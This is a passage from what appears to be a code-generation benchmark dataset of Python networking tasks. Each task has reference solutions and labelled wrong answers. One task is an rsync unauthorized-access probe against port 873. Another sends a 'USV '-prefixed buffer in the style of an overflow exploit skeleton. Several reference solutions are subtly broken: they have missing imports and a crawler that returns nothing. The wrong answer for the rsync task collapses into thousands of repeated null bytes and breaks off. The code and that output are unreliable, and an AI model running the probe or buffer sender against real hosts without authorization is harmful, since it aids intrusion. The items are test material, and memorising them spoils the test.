self.sync_timestamp = time.time()\n        self.send_sync_key()\n\n    def send_sync_key(self) -> None:\n        key = self.sync_key.to_bytes(4, 'big')\n        self.sock.send(key)"
  },
  {
    "Task_id": 359,
    "Instruction": "Task Description: Create a threaded TCP client socket class that handles bidirectional communication with a remote server, managing both sending and receiving data through queues while running in a separate thread.\n\nClass Description: ThreadedTCPClientSocket is a threading-based TCP client that establishes a connection to a specified server, sends data from a queue to the server, and puts received data into another queue. It uses non-blocking operations with select() for efficient I/O handling.\n\nAttributes:\n- ip: str - The IP address of the target server\n- port: int - The port number of the target server\n- listener_q: queue.Queue - Queue for storing received data from the server\n- remote_q: queue.Queue - Queue for storing data to be sent to the server\n- config: dict - Configuration parameters for the client\n- logger: logging.Logger - Logger object for debugging and error messages\n- sock: socket.socket - The TCP socket object for communication\n\nMethods:\n- __init__(ip, port, listener_q, remote_q, config, log) -> None - Initializes the client with connection parameters and queues\n- connect() -> int - Establishes connection to the server and returns the local port number (None if failed)\n- run() -> None - Main thread loop handling send/receive operations using select()",
    "Canonical_solution": "import socket\nimport threading\nimport select\nimport queue\nimport logging\n\nBUF_SZ = 1024\n\nclass ThreadedTCPClientSocket(threading.Thread):\n    def __init__(self, ip, port, listener_q, remote_q, config, log):\n        super(ThreadedTCPClientSocket, self).__init__()\n        self.ip = ip\n        self.port = int(port)\n        self.listener_q = listener_q\n        self.remote_q = remote_q\n        self.config = config\n        self.logger = log\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n    def connect(self):\n        try:\n            self.sock.connect((self.ip, self.port))\n            new_sport = self.sock.getsockname()[1]\n            return new_sport\n        except Exception as e:\n            self.logger.debug('Listener socket exception while attempting connection %s' % str(e))\n        return None\n\n    def run(self):\n        try:\n            while True:\n                readable, writable, exceptional = select.select([self.sock], [], [], .001)\n                if not self.remote_q.empty():\n                    data = self.remote_q.get()\n                    self.sock.send(data)\n                if readable:\n                    data = self.sock.recv(BUF_SZ)\n                    if data:\n                        self.listener_q.put(data)\n                    else:\n                        self.sock.close()\n                        sys.exit(1)\n        except Exception as e:\n            self.logger.debug('Listener socket exception %s' % str(e))",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "import socket\nimport threading\nimport select\nimport queue\nimport logging\n\nclass ThreadedTCPClientSocket:\n    def __init__(self, ip, port, listener_q, remote_q, config, log):\n        self.ip = ip\n        self.port = port\n        self.listener_q = listener_q\n        self.remote_q = remote_q\n        self.config = config\n        self.logger = log\n        self.sock = None\n\n    def connect(self):\n        try:\n            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            self.sock.settimeout(10)\n            self.sock.connect((self.ip, self.port))\n            self.logger.info(f\"Connected to {self.ip}:{self.port}\")\n            return self.sock.getsockname()[1]\n        except Exception as e:\n            self.logger.error(f\"Connection failed: {e}\")\n            return None\n\n    def run(self):\n        while True:\n            try:\n                readable, _, _ = select.select([self.sock], [], [], 1)\n                if readable:\n                    data = self.sock.recv(4096)\n                    if data:\n                        self.listener_q.put(data)\n            except Exception as e:\n                self.logger.error(f\"Error in communication: {e}\")\n                break\n            try:\n                if not self.remote_q.empty():\n                    data = self.remote_q.get_nowait()\n                    self.sock.sendall(data)\n            except Exception as e:\n                self.logger.error(f\"Error sending data: {e}\")\n                break"
  },
  {
    "Task_id": 36,
    "Instruction": "Task Description: Create a Python function that performs HTTP requests using the httpx library to fetch and process content from a given URL, with proper error handling and logging.\n\nFunction Description: The function should make a synchronous HTTP GET request to the specified URL using custom headers, handle potential exceptions, decode the response content using detected encoding, and return the extracted data along with a status code. If the request fails, it should log the error and return an error code with an empty dictionary.\n\nInput:\n- url: str | Path - The target URL to fetch content from\n- logger: logging.Logger - A logger instance for error logging\n\nOutput:\n- Tuple[int, dict] - A tuple containing:\n  - Status code (negative for errors, positive for HTTP status codes)\n  - Dictionary containing extracted data (empty if an error occurs)",
    "Canonical_solution": "import httpx\n\nheader = {\n    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/604.1 Edg/112.0.100.0'\n}\n\ndef simple_crawler(url: str | Path, logger) -> (int, dict):\n    try:\n        with httpx.Client() as client:\n            response = client.get(url, headers=header, timeout=30)\n            rawdata = response.content\n            encoding = chardet.detect(rawdata)['encoding']\n            text = rawdata.decode(encoding)\n        result = extractor.extract(text)\n    except Exception as e:\n        logger.warning(f\"cannot get content from {url}\\n{e}\")\n        return -7, {}",
    "Code_level": "Function-level",
    "FSMID_for_test": 58,
    "wrong_result": "import httpx\nimport logging\nimport chardet\n\ndef fetch_url_content(url: str | Path, logger: logging.Logger) -> tuple[int, dict]:\n    try:\n        # Ensure the URL is a string\n        if isinstance(url, Path):\n            url = str(url)\n        \n        # Create a custom HTTP client\n        client = httpx.Client()\n        \n        # Define custom headers\n        headers = {\n            'User-Agent': 'CustomUserAgent/1.0',\n            'Accept-Encoding': 'gzip, deflate'\n        }\n        \n        # Make the GET request\n        response = client.get(url, headers=headers)\n        \n        # Check if the request was successful\n        if response.status_code >= 400:\n            logger.error(f\"HTTP request failed with status code {response.status_code}\")\n            return (-response.status_code, {})\n        \n        # Detect encoding\n        encoding = chardet.detect(response.content)['encoding']\n        \n        # Decode the response content\n        content = response.text  # Using .text property which uses the detected encoding\n        \n        # Extract data (example: parse JSON if content type is JSON)\n        try:\n            data = response.json()\n        except ValueError:\n            data = {}\n        \n        # Return the result\n        return (response.status_code, data)\n    \n    except httpx.RequestError as e:\n        logger.error(f\"HTTP request error: {e}\")\n        return (-1, {})\n    except Exception as e:\n        logger.error(f\"Unexpected error: {e}\")\n        return (-1, {})"
  },
  {
    "Task_id": 364,
    "Instruction": "Task Description: Implement a TCP client function in Python that connects to a server, receives initial data, sends a formatted message, and handles connection errors gracefully.\n\nFunction Description: The function establishes a TCP connection to a specified server, receives initial data from the server, sends a formatted message (prefixed with \"USV \" and suffixed with '\\r\\n\\r\\n'), and ensures proper connection closure. Error handling is included to manage connection issues.\n\nInput:\n- host: str - The IP address or hostname of the target server\n- port: int - The port number on which the server is listening\n- buffer: str - The message content to be sent to the server\n\nOutput:\n- None (prints received data and status messages to console)\n- Success: Prints \"Buffer Sent Successfully!\" upon completion\n- Failure: Prints \"Check your debugger\" if connection fails",
    "Canonical_solution": "import socket\n\ndef tcp_client_interaction(host, port, buffer):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    try:\n        s.connect((host, port))\n        data = s.recv(1024)\n        print(\"\\n\" + data)\n        s.send(\"USV \" + buffer + '\\r\\n\\r\\n')\n    except:\n        print(\"Check your debugger\")\n    finally:\n        s.close()\n        print(\"Buffer Sent Successfully!\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "import socket\n\ndef tcp_client(host, port, buffer):\n    try:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.connect((host, port))\n            data = s.recv(1024)\n            print(\"Received:\", data.decode())\n            message = f\"USV {buffer}\\r\\n\\r\\n\"\n            s.sendall(message.encode())\n            print(\"Buffer Sent Successfully!\")\n    except Exception as e:\n        print(\"Check your debugger\")"
  },
  {
    "Task_id": 368,
    "Instruction": "Task Description: Create a function to check for unauthorized access to an Rsync service on a given IP address using TCP socket communication.\n\nFunction Description: The function attempts to connect to an Rsync service (port 873) on the specified IP address, sends a specific payload to initiate communication, and checks the response for indications of unauthorized access. If the service responds with module information without proper authentication, it indicates potential unauthorized access.\n\nInput:\n- ip: [str] - The target IP address to check for Rsync unauthorized access\n\nOutput:\n- [str] - Returns '873 Rsync Unauthorized Access' if unauthorized access is detected, otherwise returns None (implicitly through exception handling or empty response)",
    "Canonical_solution": "import socket\n\ntimeout = 3\n\ndef check_rsync_unauthorized_access(ip):\n    try:\n        socket.setdefaulttimeout(1.5)\n        payload = b\"\\x40\\x52\\x53\\x59\\x4e\\x43\\x44\\x3a\\x20\\x33\\x31\\x2e\\x30\\x0a\"\n        socket.setdefaulttimeout(timeout)\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        server_address = (ip, 873)\n        sock.connect(server_address)\n        sock.sendall(payload)\n        initinfo = sock.recv(400)\n        if b\"RSYNCD\" in initinfo:\n            sock.sendall(b\"\\x0a\")\n        modulelist = sock.recv(200)\n        sock.close()\n        if len(modulelist) > 0:\n            return '873 Rsync Unauthorized Access'\n    except Exception as e:\n        pass",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "import socket\n\ndef check_rsync_unauthorized_access(ip):\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(2)\n        sock.connect((ip, 873))\n        sock.sendall(b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x